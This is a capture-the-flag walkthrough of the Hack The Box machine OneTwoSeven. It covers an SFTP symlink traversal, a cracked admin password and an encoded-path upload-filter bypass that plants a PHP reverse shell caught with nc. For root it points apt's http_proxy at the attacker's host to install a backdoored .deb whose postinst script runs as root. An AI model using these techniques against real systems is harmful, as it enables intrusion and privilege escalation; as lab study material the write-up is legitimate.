@@ -1,0 +1,300 @@
+ONETWOSEVEN the box from hell lol 
+
+10.10.10.133
+
+Wow so yeah the most under rate CTF on the internet says med not sure how medium it was for everyone else 
+but this one gave me a headache :)
+
+First things first as always 
+
+PORT   STATE SERVICE VERSION
+22/tcp open  ssh     OpenSSH 7.4p1 Debian 10+deb9u6 (protocol 2.0)
+| ssh-hostkey: 
+|   2048 48:6c:93:34:16:58:05:eb:9a:e5:5b:96:b6:d5:14:aa (RSA)
+|   256 32:b7:f3:e2:6d:ac:94:3e:6f:11:d8:05:b9:69:58:45 (ECDSA)
+|_  256 35:52:04:dc:32:69:1a:b7:52:76:06:e3:6c:17:1e:ad (ED25519)
+80/tcp open  http    Apache httpd 2.4.25 ((Debian))
+|_http-server-header: Apache/2.4.25 (Debian)
+|_http-title: Page moved.
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+
+We see a website running on http so we now head over there and check it out to
+see what is going on.
+
+Upon click around you should end up here - 10.10.10.133/signup
+There you will receive a set of sftp creds and a personal homepage
+based on the unique string given.
+
+Now we login and take a look around to see what we can do inside of the sftp service
+you will notice right off the cuff you can run ln or symlink which means we have
+rights to run that command and symbolically link to another directory.
+
+This is how I got things working other methods are I am sure out there but this is
+what got me there. After seeing a strange file ots-man-addons.php scanning around
+using dir buster I figured try that one first since its owned by root or higher
+user.
+
+ln -s / /public_html/ots-man-addons.php = this worked
+
+gives access to / directory and in /var/www/html-admin/login.php.swp there was goodies
+
+['username'] == 'ots-admin' && hash('sha256',$_POST['password']) == '11c5a42c9d74d5442ef3cc835bda1b3e7cc7f494e704a10d0de426b2fbe5cbd8')
+11c5a42c9d74d5442ef3cc835bda1b3e7cc7f494e704a10d0de426b2fbe5cbd8 SHA-256 Homesweethome1 (cracked)
+
+So now we travel abroad to find out what these creds are exactly for. Looking in the homepage
+you will see the following >>>>
+
+href="http://onetwoseven.htb:60080/">Admin</a></li>
+
+In the source code so they must have a way to tunnel to get to that port and sure
+enough that was the case. Taking your existing user given tunnel like the following
+and shout out to a team member for getting this as I kept using localhost :)
+
+We also notice DNS so in /etc/hosts add the following line - 10.10.10.133 onetwoseven.htb
+
+Next we create our tunnel to the high port like so -
+
+ssh -f -N -L 127.0.0.1:60080:127.0.0.1:60080 ots-yourusername@onetwoseven.htb
+
+Place in creds and it disapeared so what happened is we created a ssh tunnel
+and the -f option will run it in background for us.
+
+Next we now go in firefox or how ever you imagine this can be done elsewhere like burp
+or other tools this is how I did it. I added a proxy in the network settings and set port
+60080 for all protocols just like you would for burp or other related reasons to set a proxy.
+
+We now travel to - onetwoseven.htb:60080
+
+Boom! We made it now with the creds we cracked earlier we place them as follows
+
+username - ots-admin
+password - Homesweethome1
+
+Thats it! we are now in and redirected to onetwoseven.htb:60080/menu.php
+and we are now in the admin area. Now we look to see what is going on 
+the menu page and you can see many plugins and a disabled button at the bottom
+
+Clicking on OTS-Default user and huh looks like another set of creds available to
+us we now take them creds
+
+Username: ots-yODc2NGQ
+Password: f528764d
+
+Then we login into sftp again and we now find user.txt :)
+
+so you can - get user.txt and download the file
+
+# cat user.txt
+93a4ce6d82bd35da************
+
+So now you ask yourself as I did how do we get a plugin uploaded
+digging in the source of menu.php we play with the button and
+see we can get it working to submit something. So also important
+looking at adding we click on OTS Addon Manager
+
+Something weird happens and tells us by rewrite rules we can 
+manually submit an addon. Before doing this you read carefully
+the source code of ots-man-addon.php file and notice by clicking
+on view source it will show you the php source code for each plugin.
+
+We notice that there is a certain header needed like so - 
+
+<?php session_start(); if (!isset ($_SESSION['username'])) { header("Location: /menu.php"); }; if ( strpos($_SERVER['REQUEST_URI'], '/addons/') !== false ) { die(); };
+
+So we can see its accepting the request and if it has addons in it the code will die()
+We add this to our pentest monkey php backdoor as the following -
+
+<?php session_start(); if (!isset ($_SESSION['username'])) { header("Location: /menu.php"); }; if ( strpos($_SERVER['REQUEST_URI'], '/addons/') !== false ) { die(); };
+# OneTwoSeven Admin Plugin
+# OTS Payload 
+
+Make sure to remove the <?php tag from the top of the payload to include the header
+we need so the rest of our code will execute also notice we had to include based off
+the source in ots-man-addon.php 2 hash tags that are parsed and soon will see why.
+
+After getting your payload ready now its a kung fu battle to bypass the filter here is how
+I was able to get past and there may again be many different ways to achcieve this beyond the
+scope of the writeup.
+
+Here is the route I went without burp manually adding this to the button area
+by using inspect element. Where is says addon-upload by itself add the following -
+
+<form action="ad%64ons/ots-man-addon.php/addon-upload.php" 
+ 
+<input type=submit name=name 
+
+You can what happened is 1 of the chars was encoded we now upload our payload
+with the special header mentioned. We named it OTS Payload and click submit
+
+Boom we now see our plugin on the page!!
+
+So we ofcourse go back to our box and - nc -lvp 1234
+Then we click on on our new plugin and now we
+have www-admin-data user.
+
+Now that was awlful right lmfao so now we move around and see what we can
+sudo off the jump we see that our user can run sudo apt-update and sudo apt-upgrade
+without a password. So hmm right away went for core exploits using MITM techniques
+but without being on the same subnet that didnt make sense. So now we think
+like the metasploit Linux trojan walkthrough how do we get a deb package on here??
+
+
+Like so we missed initially in the sudo output the following env keep+="http_proxy, ect..
+
+We also notice running sudo apt-get update it looks for a strange dns name packages.onetwoseven.htb
+so hmm what if we set the http_proxy to our host and fake the DNS name maybe we can pull down
+a package this way.
+
+So by setting the following = http_proxy=http://10.10.10.1 example use your own IP
+we see running python -m SimpleHTTPServer 80 it hits our box and is certainly looking
+for some updates.
+
+So that is what we do next looking the version and where else it was looking to devuan.org
+as well for packages other than packages.onetwoseven.htb so we travel there and look for
+updated versions or any package we can back door to match our box here.
+
+I found this one - base-files_10.1+devuan1.1_all.deb
+
+By following like this article here we found a way to backdoor it the same
+way just using a different method so all of this forum applied except the
+MITM part with DNS we are using a completely different approach but very close
+to it. Find article here - https://versprite.com/blog/apt-mitm-package-injection/
+
+
+So we get our Release file and download our packages and packages.gz then we 
+also grab our base-files_10.1+devuan1.1_all.deb package as well.
+
+We use dpkg -d base-files_10.1+devuan1.1_all.deb new.deb
+and we now extracted the deb package. There are many ways to 
+get this one but again this is the way I went forward.
+
+In /DEBIAN/postinst you will see the post install script
+we know that upon install this runs with the privs of the root
+user based off what we already know about Linux and installing 
+them normally. 
+
+We now find a clear aread to inject our one liner in the bash script -
+
+"cp /root/root.txt /tmp/loot && chmod 777 /tmp/loot"
+
+I know cheating skid but at this point I wasn't too intrested in shellin it as
+was very time consuming and said well I just want the flag for now lol. Plus
+my first initial payload didn't work wasn't sure if sec was blocking an outside
+shell so I went this route so blah. 
+
+Now after closing the file and we are working on our own box btw
+this cannot really be done from what I know on the CTF box we then 
+build our package back together again follow article for special
+order of things to do.
+
+Next we now must alter our packages.gz file and we add the follow to it
+
+commands used to get this info because we must alter the original hashes to
+match our new built package the file size is critical!!
+
+so 
+md5sum package.deb
+sha1sum package.deb
+sha256 package.deb
+
+then ls -l and get the filesize for packages and packages.gz
+
+you can add it to packages file and then re zip or with archive viewer can open
+it up and make the changes either way.
+
+Our results in packages and packages.gz
+
+base-files_10.1+devuan1.1_all.deb
+71324
+b8787dad65521ee4de121e555b09117e 
+1ad68e936351fec9360fe316ce75501a104f0121
+d6f5a4a3bc2b60e5f77bdcd928fc778e8574b3c49d55b1f921bdc3174c1a4f16
+
+
+Next we go to our release file and alter it as well with the same 
+commands to get the file size and hashes we now have to add this
+to the Release file -
+
+596929cce37d31478d3644f896cc5f7f  Packages
+ad5c56ee83858cba5e9bb524beebc74f  Packages.gz
+fc77823d5da3b15db1dc2d1dd7e5dbfa17854f72  Packages
+6090b9cb53c63be5776f6a56d2756b4b25d2cc1c  Packages.gz
+3d4c12e971515dbde910c129d8438f8ed803d89611ac7901ac032809cd0446fd  Packages
+6f7fd282e6617d5c684b0585c8177a7156a08539ee0666336ab0bab322355cad  Packages.gz
+
+
+Great now after adding everything there is so more major steps involved
+please follow article mentioned so you can understand further beyond the 
+scope of this writeup.
+
+We add the following to our root directory for our web server this can also be
+done many ways this was my course of action to get root.
+
+/var/www/html/devuan/devuan/pool/main/b/base-files/base-files_10.1+devuan1.1_all.deb
+/var/www/html/devuan/dists/ascii/Release
+/var/www/html/devuan/dists/ascii/main/binary-amd64/Packages
+/var/www/html/devuan/dists/ascii/main/binary-amd64/Packages.gz
+
+Here is an example release file for reference -
+
+Origin: Devuan
+Label: ascii
+Suite: ascii
+Version: 2.0.0
+Codename: ascii
+Date: Mon, 19 Aug 2019 01:27:06 UTC
+Valid-Until: Sat, 28 Sept 2019 01:27:06 UTC
+Architectures: alpha amd64 arm64 armel armhf hppa i386 ia64 mips mipsel powerpc ppc64el s390x sparc
+Components: main contrib non-free raspi beaglebone droid4 n900 n950 n9 sunxi exynos
+
+MD5Sum:
+ 596929cce37d31478d3644f896cc5f7f   920 devuan/main/binary-amd64/Packages
+ ad5c56ee83858cba5e9bb524beebc74f   600 devaun/main/binary-amd64/Packages.gz
+SHA1:
+ fc77823d5da3b15db1dc2d1dd7e5dbfa17854f72   920 devuan/main/binary-amd64/Packages
+ 6090b9cb53c63be5776f6a56d2756b4b25d2cc1c   600 devaun/main/binary-amd64/Packages.gz
+SHA256:
+ 3d4c12e971515dbde910c129d8438f8ed803d89611ac7901ac032809cd0446fd   920 devuan/main/binary-amd64/Packages
+ 6f7fd282e6617d5c684b0585c8177a7156a08539ee0666336ab0bab322355cad   600 devaun/main/binary-amd64/Packages.gz
+
+Notice we needed to add the hashes we got and the new file sizes pm me on HTB will send a video
+of this entire long process lol. 
+
+Now we go back to our target box as www-admin-data$ and we try now with
+everything in place to run sudo apt-get update again see what happens
+
+first we do the following
+
+service apache2 start - on your local machine
+we place "10.10.10.133 packages.onetwoseven.htb" in /etc/hosts on our machine!!!
+
+export http_proxy=http://10.10.10.1 - example IP and this is done on the target machine!!!
+
+Now we look like we are finally and I mean finally ready to jack the root flag
+this time. We run it and right away we see it get:packages.onetwoseven.htb Release file
+
+So looks like we are golden now
+
+sudo apt-get update
+
+next run -
+
+sudo apt-get upgrade
+
+Boom!!! we see our hot .deb package coming on through which makes hacker happy!!
+
+Now we travel over and fingers crossed in /tmp and we see something that almost
+made me cry a lil /tmp/loot
+
+we ofcouse -
+
+onetwoseven:/tmp$ cat loot
+cat loot
+2d380a25a8e3bf*********
+
+
+Roooted
+
+Be well and ofc #Hacktheplanet!
+#C-3P0
+
